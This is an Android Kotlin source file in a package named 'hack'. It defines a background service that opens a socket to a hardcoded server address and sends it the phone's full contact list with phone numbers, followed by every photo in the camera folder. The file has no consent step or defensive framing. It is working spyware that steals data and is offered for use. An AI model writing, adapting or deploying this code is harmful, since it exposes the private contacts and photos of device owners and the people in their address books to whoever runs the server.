package com.example.hack

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.ContentResolver
import android.content.Intent
import android.database.Cursor
import android.os.Build
import android.os.Environment
import android.os.IBinder
import android.provider.ContactsContract
import android.util.Log
import androidx.core.app.NotificationCompat
import java.io.File
import java.io.FileInputStream
import java.io.OutputStream
import java.net.Socket

class FileTransferService : Service() {

    private val CHANNEL_ID = "FileTransferServiceChannel"
    private val SERVER_IP = "192.168.1.5" // Replace with your server's IP address
    private val SERVER_PORT = 8080

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(1, createNotification())
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Thread {
            try {
                val socket = Socket(SERVER_IP, SERVER_PORT)
                val outputStream = socket.getOutputStream()

                // Transfer contacts
                transferContacts(outputStream)

                // Transfer files
                transferFiles(outputStream)

                outputStream.close()
                socket.close()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }.start()
        return START_NOT_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val serviceChannel = NotificationChannel(
                CHANNEL_ID,
                "File Transfer Service Channel",
                NotificationManager.IMPORTANCE_DEFAULT
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(serviceChannel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("File Transfer Service")
            .setContentText("Transferring files and contacts in the background")
            .setSmallIcon(R.mipmap.ic_launcher)
            .build()
    }

    private fun transferContacts(outputStream: OutputStream) {
        try {
            val contacts = getContacts()
            outputStream.write("CONTACTS".toByteArray())
            outputStream.write(contacts.toByteArray())
            Log.i("FileTransferService", "Contacts data successfully sent.")
        } catch (e: Exception) {
            Log.e("FileTransferService", "Error while sending contacts: ${e.message}")
        }
    }

    private fun transferFiles(outputStream: OutputStream) {
        val directoryPath = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).absolutePath + "/Camera/"
        val directory = File(directoryPath)
        if (directory.exists() && directory.isDirectory) {
            val files = directory.listFiles()
            if (files != null && files.isNotEmpty()) {
                files.forEach { file ->
                    try {
                        val fileDetails = "${file.name}<SEPARATOR>${file.length()}"
                        outputStream.write(fileDetails.toByteArray())

                        val fileInputStream = FileInputStream(file)
                        val buffer = ByteArray(4096)
                        var bytesRead: Int

                        while (fileInputStream.read(buffer).also { bytesRead = it } > 0) {
                            outputStream.write(buffer, 0, bytesRead)
                        }

                        fileInputStream.close()
                        Log.i("FileTransferService", "File ${file.name} successfully sent.")
                    } catch (e: Exception) {
                        Log.e("FileTransferService", "Error while sending file ${file.name}: ${e.message}")
                    }
                }
            } else {
                Log.e("FileTransferService", "No files found in the directory")
            }
        } else {
            Log.e("FileTransferService", "Directory does not exist or is not a directory")
        }
    }

    private fun getContacts(): String {
        val contactList = StringBuilder()
        val resolver: ContentResolver = contentResolver
        val cursor: Cursor? = resolver.query(
            ContactsContract.Contacts.CONTENT_URI,
            null, null, null, null
        )

        cursor?.let {
            if (it.count > 0) {
                while (it.moveToNext()) {
                    // Safely get column indices and check for -1
                    val idIndex = it.getColumnIndex(ContactsContract.Contacts._ID)
                    val nameIndex = it.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
                    val hasPhoneNumberIndex = it.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)

                    // Check if indices are valid
                    if (idIndex >= 0 && nameIndex >= 0 && hasPhoneNumberIndex >= 0) {
                        val id = it.getString(idIndex)
                        val name = it.getString(nameIndex)
                        if (it.getInt(hasPhoneNumberIndex) > 0) {
                            val pCursor: Cursor? = resolver.query(
                                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                null,
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                                arrayOf(id), null
                            )
                            pCursor?.let { phoneCursor ->
                                val phoneNoIndex = phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                                while (phoneCursor.moveToNext()) {
                                    if (phoneNoIndex >= 0) {
                                        val phoneNo = phoneCursor.getString(phoneNoIndex)
                                        contactList.append("Name: $name, Phone Number: $phoneNo\n")
                                    }
                                }
                                phoneCursor.close()
                            }
                        }
                    }
                }
            }
            it.close()
        }
        return contactList.toString()
    }

}
